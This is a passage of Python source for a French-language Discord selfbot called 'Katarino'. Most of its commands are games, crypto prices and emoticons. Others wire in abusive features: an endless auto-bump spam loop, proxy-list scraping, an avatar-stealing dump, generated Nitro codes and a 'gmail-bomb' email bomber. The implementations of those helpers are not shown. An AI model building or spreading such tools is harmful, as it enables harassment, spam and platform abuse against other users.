	  'Il y a de bonnes chances'
    ]
    answer = random.choice(responses)
    embed = discord.Embed()
    embed.add_field(name="Question", value=question, inline=False)
    embed.add_field(name="Réponse", value=answer, inline=False)
    embed.set_thumbnail(url="https://www.horoscope.com/images-US/games/game-magic-8-ball-no-text.png")
    embed.set_footer(text=datetime.datetime.now())
    await ctx.send(embed=embed)

@Katarino.command(aliases=['slots', 'bet'])
async def slot(ctx): # b'\xfc'
    await ctx.message.delete()
    emojis = "🍎🍊🍐🍋🍉🍇🍓🍒"
    a = random.choice(emojis)
    b = random.choice(emojis)
    c = random.choice(emojis)
    slotmachine = f"**[ {a} {b} {c} ]\n{ctx.author.name}**,"
    if (a == b == c):
        await ctx.send(embed=discord.Embed.from_dict({"title":"Slot machine", "description":f"{slotmachine} Tous les matchs, vous avez gagné!"}))
    elif (a == b) or (a == c) or (b == c):
        await ctx.send(embed=discord.Embed.from_dict({"title":"Slot machine", "description":f"{slotmachine} 2 d'affilée, vous avez gagné!"}))
    else:
        await ctx.send(embed=discord.Embed.from_dict({"title":"Slot machine", "description":f"{slotmachine} Pas de match, tu as perdu"}))

@Katarino.command()
async def joke(ctx):  # b'\xfc'
    await ctx.message.delete()
    headers = {
        "Accept": "application/json"
    }
    async with aiohttp.ClientSession()as session:
        async with session.get("https://icanhazdadjoke.com", headers=headers) as req:
            r = await req.json()
    await ctx.send(r["joke"])

@Katarino.command(name='auto-bump', aliases=['bump'])
async def _auto_bump(ctx, channelid): # b'\xfc'
    await ctx.message.delete()
    count = 0
    while True:
        try:
            count += 1
            channel = Katarino.get_channel(int(channelid))
            await channel.send('!d bump')
            print(f'{Fore.BLUE}[AUTO-BUMP] {Fore.GREEN}Bump number: {count} sent'+Fore.RESET)
            await asyncio.sleep(7200)
        except Exception as e:
            print(f"{Fore.RED}[ERROR]: {Fore.YELLOW}{e}"+Fore.RESET)

@Katarino.command()
async def tts(ctx, *, message): # b'\xfc'
    await ctx.message.delete()
    buff = await do_tts(message)
    await ctx.send(file=discord.File(buff, f"{message}.wav"))

@Katarino.command()
async def upper(ctx, *, message): # b'\xfc'
    await ctx.message.delete()
    message = message.upper()
    await ctx.send(message)

@Katarino.command(aliases=['guildpfp'])
async def guildicon(ctx): # b'\xfc'
    await ctx.message.delete()
    em = discord.Embed(title=ctx.guild.name)
    em.set_image(url=ctx.guild.icon_url)
    await ctx.send(embed=em)

@Katarino.command(name='backup-f', aliases=['friendbackup', 'friend-backup', 'backup-friends', 'backupf'])
async def _backup_f(ctx): # b'\xfc'
    await ctx.message.delete()
    for friend in Katarino.user.friends:
       friendlist = (friend.name)+'#'+(friend.discriminator)
       with open('Backup/friends.txt', 'a+') as f:
           f.write(friendlist+"\n" )
    for block in Katarino.user.blocked:
        blocklist = (block.name)+'#'+(block.discriminator)
        with open('Backup/blocked.txt', 'a+') as f:
            f.write(blocklist+"\n" )

@Katarino.command(name='first-message', aliases=['firstmsg', 'fm', 'firstmessage'])
async def _first_message(ctx, channel: discord.TextChannel = None): # b'\xfc'
    await ctx.message.delete()
    if channel is None:
        channel = ctx.channel
    first_message = (await channel.history(limit=1, oldest_first=True).flatten())[0]
    embed = discord.Embed(description=first_message.content)
    embed.add_field(name="First Message", value=f"[Jump]({first_message.jump_url})")
    await ctx.send(embed=embed)

@Katarino.command()
async def mac(ctx, mac): # b'\xfc'
    await ctx.message.delete()
    r = requests.get('http://api.macvendors.com/' + mac)
    em = discord.Embed(title='Résultat de la recherche MAC', description=r.text, colour=0xDEADBF)
    em.set_author(name='MAC Chercheur', icon_url='https://regmedia.co.uk/2016/09/22/wifi_icon_shutterstock.jpg?x=1200&y=794')
    await ctx.send(embed=em)

@Katarino.command()
async def abc(ctx): # b'\xfc'
    await ctx.message.delete()
    ABC = ['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'ñ', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z']
    message = await ctx.send(ABC[0])
    await asyncio.sleep(2)
    for _next in ABC[1:]:
        await message.edit(content=_next)
        await asyncio.sleep(2)

@Katarino.command(aliases=['bitcoin'])
async def btc(ctx): # b'\xfc'
    await ctx.message.delete()
    r = requests.get('https://min-api.cryptocompare.com/data/price?fsym=BTC&tsyms=USD,EUR')
    r = r.json()
    usd = r['USD']
    eur = r['EUR']
    em = discord.Embed(description=f'USD: `{str(usd)}$`\nEUR: `{str(eur)}€`')
    em.set_author(name='Bitcoin', icon_url='https://cdn.pixabay.com/photo/2013/12/08/12/12/bitcoin-225079_960_720.png')
    await ctx.send(embed=em)

@Katarino.command(aliases=['ethereum'])
async def eth(ctx): # b'\xfc'
    await ctx.message.delete()
    r = requests.get('https://min-api.cryptocompare.com/data/price?fsym=ETH&tsyms=USD,EUR')
    r = r.json()
    usd = r['USD']
    eur = r['EUR']
    em = discord.Embed(description=f'USD: `{str(usd)}$`\nEUR: `{str(eur)}€`')
    em.set_author(name='Ethereum', icon_url='https://cdn.discordapp.com/attachments/271256875205525504/374282740218200064/2000px-Ethereum_logo.png')
    await ctx.send(embed=em)

@Katarino.command()
async def topic(ctx): # b'\xfc'
    await ctx.message.delete()
    r = requests.get('https://www.conversationstarters.com/generator.php').content
    soup = bs4(r, 'html.parser')
    topic = soup.find(id="random").text
    await ctx.send(topic)

@Katarino.command(aliases=['wouldyourather', 'would-you-rather', 'wyrq'])
async def wyr(ctx): # b'\xfc'
    await ctx.message.delete()
    r = requests.get('https://www.conversationstarters.com/wyrqlist.php').text
    soup = bs4(r, 'html.parser')
    qa = soup.find(id='qa').text
    qor = soup.find(id='qor').text
    qb = soup.find(id='qb').text
    em = discord.Embed(description=f'{qa}\n{qor}\n{qb}')
    await ctx.send(embed=em)

@Katarino.command()
async def hastebin(ctx, *, message): # b'\xfc'
    await ctx.message.delete()
    r = requests.post("https://hastebin.com/documents", data=message).json()
    await ctx.send(f"<https://hastebin.com/{r['key']}>")

@Katarino.command()
async def ascii(ctx, *, text): # b'\xfc'
    await ctx.message.delete()
    r = requests.get(f'http://artii.herokuapp.com/make?text={urllib.parse.quote_plus(text)}').text
    if len('```'+r+'```') > 2000:
        return
    await ctx.send(f"```{r}```")

@Katarino.command()
async def anal(ctx): # b'\xfc'
    await ctx.message.delete()
    r = requests.get("https://nekos.life/api/v2/img/anal")
    res = r.json()
    em = discord.Embed()
    em.set_image(url=res['url'])
    await ctx.send(embed=em)

@Katarino.command()
async def erofeet(ctx): # b'\xfc'
    await ctx.message.delete()
    r = requests.get("https://nekos.life/api/v2/img/erofeet")
    res = r.json()
    em = discord.Embed()
    em.set_image(url=res['url'])
    await ctx.send(embed=em)

@Katarino.command()
async def feet(ctx): # b'\xfc'
    await ctx.message.delete()
    r = requests.get("https://nekos.life/api/v2/img/feetg")
    res = r.json()
    em = discord.Embed()
    em.set_image(url=res['url'])
    await ctx.send(embed=em)

@Katarino.command()
async def hentai(ctx): # b'\xfc'
    await ctx.message.delete()
    r = requests.get("https://nekos.life/api/v2/img/Random_hentai_gif")
    res = r.json()
    em = discord.Embed()
    em.set_image(url=res['url'])
    await ctx.send(embed=em)

@Katarino.command()
async def boobs(ctx): # b'\xfc'
    await ctx.message.delete()
    r = requests.get("https://nekos.life/api/v2/img/boobs")
    res = r.json()
    em = discord.Embed()
    em.set_image(url=res['url'])
    await ctx.send(embed=em)

@Katarino.command()
async def tits(ctx): # b'\xfc'
    await ctx.message.delete()
    r = requests.get("https://nekos.life/api/v2/img/tits")
    res = r.json()
    em = discord.Embed()
    em.set_image(url=res['url'])
    await ctx.send(embed=em)

@Katarino.command()
async def blowjob(ctx): # b'\xfc'
    await ctx.message.delete()
    r = requests.get("https://nekos.life/api/v2/img/blowjob")
    res = r.json()
    em = discord.Embed()
    em.set_image(url=res['url'])
    await ctx.send(embed=em)

@Katarino.command()
async def lewdneko(ctx): # b'\xfc'
    await ctx.message.delete()
    r = requests.get("https://nekos.life/api/v2/img/nsfw_neko_gif")
    res = r.json()
    em = discord.Embed()
    em.set_image(url=res['url'])
    await ctx.send(embed=em)

@Katarino.command()
async def lesbian(ctx): # b'\xfc'
    await ctx.message.delete()
    r = requests.get("https://nekos.life/api/v2/img/les")
    res = r.json()
    em = discord.Embed()
    em.set_image(url=res['url'])
    await ctx.send(embed=em)

@Katarino.command()
async def feed(ctx, user: discord.Member): # b'\xfc'
    await ctx.message.delete()
    r = requests.get("https://nekos.life/api/v2/img/feed")
    res = r.json()
    em = discord.Embed(description=user.mention)
    em.set_image(url=res['url'])
    await ctx.send(embed=em)

@Katarino.command()
async def tickle(ctx, user: discord.Member): # b'\xfc'
    await ctx.message.delete()
    r = requests.get("https://nekos.life/api/v2/img/tickle")
    res = r.json()
    em = discord.Embed(description=user.mention)
    em.set_image(url=res['url'])
    await ctx.send(embed=em)

@Katarino.command()
async def slap(ctx, user: discord.Member): # b'\xfc'
    await ctx.message.delete()
    r = requests.get("https://nekos.life/api/v2/img/slap")
    res = r.json()
    em = discord.Embed(description=user.mention)
    em.set_image(url=res['url'])
    await ctx.send(embed=em)

@Katarino.command()
async def hug(ctx, user: discord.Member): # b'\xfc'
    await ctx.message.delete()
    r = requests.get("https://nekos.life/api/v2/img/hug")
    res = r.json()
    em = discord.Embed(description=user.mention)
    em.set_image(url=res['url'])
    await ctx.send(embed=em)

@Katarino.command()
async def smug(ctx, user: discord.Member): # b'\xfc'
    await ctx.message.delete()
    r = requests.get("https://nekos.life/api/v2/img/smug")
    res = r.json()
    em = discord.Embed(description=user.mention)
    em.set_image(url=res['url'])
    await ctx.send(embed=em)

@Katarino.command()
async def pat(ctx, user: discord.Member): # b'\xfc'
    await ctx.message.delete()
    r = requests.get("https://nekos.life/api/v2/img/pat")
    res = r.json()
    em = discord.Embed(description=user.mention)
    em.set_image(url=res['url'])
    await ctx.send(embed=em)

@Katarino.command()
async def kiss(ctx, user: discord.Member): # b'\xfc'
    await ctx.message.delete()
    r = requests.get("https://nekos.life/api/v2/img/kiss")
    res = r.json()
    em = discord.Embed(description=user.mention)
    em.set_image(url=res['url'])
    await ctx.send(embed=em)

@Katarino.command(aliases=['proxy'])
async def proxies(ctx): # b'\xfc'
    await ctx.message.delete()
    file = open("Data/Http-proxies.txt", "a+")
    res = requests.get('https://api.proxyscrape.com/?request=displayproxies&proxytype=http&timeout=1500')
    proxies = []
    for proxy in res.text.split('\n'):
        proxy = proxy.strip()
        if proxy:
            proxies.append(proxy)
    for p in proxies:
        file.write((p)+"\n")
    file = open("Data/Https-proxies.txt", "a+")
    res = requests.get('https://api.proxyscrape.com/?request=displayproxies&proxytype=https&timeout=1500')
    proxies = []
    for proxy in res.text.split('\n'):
        proxy = proxy.strip()
        if proxy:
             proxies.append(proxy)
    for p in proxies:
        file.write((p)+"\n")
    file = open("Data/Socks4-proxies.txt", "a+")
    res = requests.get('https://api.proxyscrape.com/?request=displayproxies&proxytype=socks4&timeout=1500')
    proxies = []
    for proxy in res.text.split('\n'):
        proxy = proxy.strip()
        if proxy:
            proxies.append(proxy)
    for p in proxies:
        file.write((p)+"\n")
    file = open("Data/Socks5-proxies.txt", "a+")
    res = requests.get('https://api.proxyscrape.com/?request=displayproxies&proxytype=socks5&timeout=1500')
    proxies = []
    for proxy in res.text.split('\n'):
        proxy = proxy.strip()
        if proxy:
            proxies.append(proxy)
    for p in proxies:
        file.write((p)+"\n")

@Katarino.command()
async def uptime(ctx): # b'\xfc'
    await ctx.message.delete()
    uptime = datetime.datetime.utcnow() - start_time
    uptime = str(uptime).split('.')[0]
    await ctx.send(f'`'+uptime+'`')

@Katarino.command()
async def purge(ctx, amount: int): # b'\xfc'
    await ctx.message.delete()
    async for message in ctx.message.channel.history(limit=amount).filter(lambda m: m.author == Katarino.user).map(lambda m: m):
        try:
           await message.delete()
        except:
            pass

@Katarino.command(name='group-leaver', aliase=['leaveallgroups', 'leavegroup', 'leavegroups'])
async def _group_leaver(ctx): # b'\xfc'
    await ctx.message.delete()
    for channel in Katarino.private_channels:
        if isinstance(channel, discord.GroupChannel):
            await channel.leave()

@Katarino.command()
async def help(ctx): # b'\xfc'
    await ctx.message.delete()
    url = 'https://katarinoo.000webhostapp.com/commandes.html'
    r = requests.get(url)
    if r.status_code == 200:
        webbrowser.open(url)
    else:
        print('La page est en maintenance attendez quil soit online ')

@Katarino.command()
async def stream(ctx, *, message): # b'\xfc'
    await ctx.message.delete()
    stream = discord.Streaming(
        name=message,
        url=stream_url,
    )
    await Katarino.change_presence(activity=stream)

@Katarino.command()
async def game(ctx, *, message): # b'\xfc'
    await ctx.message.delete()
    game = discord.Game(
        name=message
    )
    await Katarino.change_presence(activity=game)

@Katarino.command()
async def listening(ctx, *, message): # b'\xfc'
    await ctx.message.delete()
    await Katarino.change_presence(
        activity=discord.Activity(
            type=discord.ActivityType.listening,
            name=message,
        ))

@Katarino.command()
async def watching(ctx, *, message): # b'\xfc'
    await ctx.message.delete()
    await Katarino.change_presence(
        activity=discord.Activity(
            type=discord.ActivityType.watching,
            name=message
        ))

@Katarino.command(aliases=['markasread', 'ack'])
async def read(ctx): # b'\xfc'
    await ctx.message.delete()
    for guild in Katarino.guilds:
        await guild.ack()

@Katarino.command()
async def reverse(ctx, *, message): # b'\xfc'
    await ctx.message.delete()
    message = message[::-1]
    await ctx.send(message)

@Katarino.command()
async def shrug(ctx): # b'\xfc'
    await ctx.message.delete()
    shrug = r'¯\_(ツ)_/¯'
    await ctx.send(shrug)

@Katarino.command()
async def lenny(ctx): # b'\xfc'
    await ctx.message.delete()
    lenny = '( ͡° ͜ʖ ͡°)'
    await ctx.send(lenny)

@Katarino.command()
async def tableflip(ctx): # b'\xfc'
    await ctx.message.delete()
    tableflip = '(╯°□°）╯︵ ┻━┻'
    await ctx.send(tableflip)

@Katarino.command()
async def unflip(ctx): # b'\xfc'
    await ctx.message.delete()
    unflip = '┬─┬ ノ( ゜-゜ノ)'
    await ctx.send(unflip)

@Katarino.command()
async def bold(ctx, *, message): # b'\xfc'
    await ctx.message.delete()
    await ctx.send('**'+message+'**')

@Katarino.command()
async def secret(ctx, *, message): # b'\xfc'
	await ctx.message.delete()
	await ctx.send('||'+message+'||')

@Katarino.command(name='role-hexcode', aliases=['rolecolor'])
async def _role_hexcode(ctx, *, role: discord.Role): # b'\xfc'
    await ctx.message.delete()
    await ctx.send(f"{role.name} : {role.color}")

@Katarino.command(name='get-hwid', aliases=['hwid', 'gethwid', 'hwidget'])
async def _get_hwid(ctx): # b'\xfc'
    await ctx.message.delete()
    print(f"HWID: {Fore.YELLOW}{hwid}"+Fore.RESET)

@Katarino.command()
async def empty(ctx): # b'\xfc'
    await ctx.message.delete()
    await ctx.send(chr(173))

@Katarino.command()
async def everyone(ctx): # b'\xfc'
    await ctx.message.delete()
    await ctx.send('https://@everyone@google.com')

@Katarino.command()
async def logout(ctx): # b'\xfc'
    await ctx.message.delete()
    await Katarino.logout()

@Katarino.command(aliases=['btc-stream', 'streambtc', 'stream-btc', 'btcstatus'])
async def btcstream(ctx):  # b'\xfc'
    await ctx.message.delete()
    btc_status.start()

@Katarino.command(name='steal-all-pfp', aliases=['steal-all-pfps', 'stealallpfps'])
async def _steal_all_pfp(ctx): # b'\xfc'
    await ctx.message.delete()
    Dump(ctx)

@Katarino.command(aliases=['clearconsole', 'consoleclear'])
async def cls(ctx): # b'\xfc'
    await ctx.message.delete()
    Clear()
    startprint()

@Katarino.command()
async def nitro(ctx): # b'\xfc'
    await ctx.message.delete()
    await ctx.send(Nitro())

@Katarino.command(name='gmail-bomb', aliases=['gmail-bomber', 'gmailbomb', 'email-bomber', 'emailbomber'])
async def _gmail_bomb(ctx): # b'\xfc'
    await ctx.message.delete()
    GmailBomber()

if __name__ == '__main__':
	Init()
